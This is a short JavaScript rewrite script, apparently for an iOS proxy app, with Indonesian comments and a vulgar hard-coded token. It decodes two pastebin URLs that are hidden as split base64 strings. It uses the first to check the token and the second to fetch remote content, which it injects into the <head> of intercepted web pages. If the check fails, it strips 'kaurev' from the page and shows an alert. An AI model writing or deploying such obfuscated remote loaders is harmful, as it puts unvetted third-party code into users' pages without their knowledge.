const MY_TOKEN = "malik_pepek"; 

// Link dipotong (Tetap Aman)
const _0xU1 = "aHR0cHM6"+"Ly9wYXN0ZWJpbi"+"5jb20vcmF3L0d"+"NMVIyZjh1";
const _0xU2 = "aHR0cHM6"+"Ly9wYXN0ZWJp"+"bi5jb20vcmF3L"+"2tSWFY3ZnNU";

const _0xR1 = { 
    url: atob(_0xU1) + "?t=" + Math.random(), // Pakai Random agar tidak kena Cache
    method: "GET"
};

$task.fetch(_0xR1).then(response => {
    let body = $response.body;
    
    // VALIDASI: Apakah token benar-benar ada di database Pastebin?
    const isAuthorized = response.body && response.body.includes(MY_TOKEN);

    if (isAuthorized) {
        // JIKA TOKEN BENAR -> AMBIL UI
        const _0xR2 = { url: atob(_0xU2) + "?t=" + Math.random() };
        $task.fetch(_0xR2).then(resp2 => {
            if (resp2.body && body) {
                // Suntikkan UI hanya jika token Valid
                $done({ body: body.replace("<head>", "<head>" + resp2.body) });
            } else {
                $done({});
            }
        }, () => $done({}));

    } else {
        // JIKA TOKEN SALAH -> PAKSA BERSIHKAN HALAMAN
        // Kita hapus kemungkinan script "Kaurev" yang nyangkut di cache
        if (body) {
            body = body.replace(/kaurev/g, "OFFLINE"); // Matikan paksa jika ada sisa cache
        }
        $notify("SECURITY", "ACCESS DENIED", "Token Invalid: " + MY_TOKEN);
        $done({ body: body }); // Kembalikan body murni tanpa suntikan
    }
}, () => {
    $done({});
});
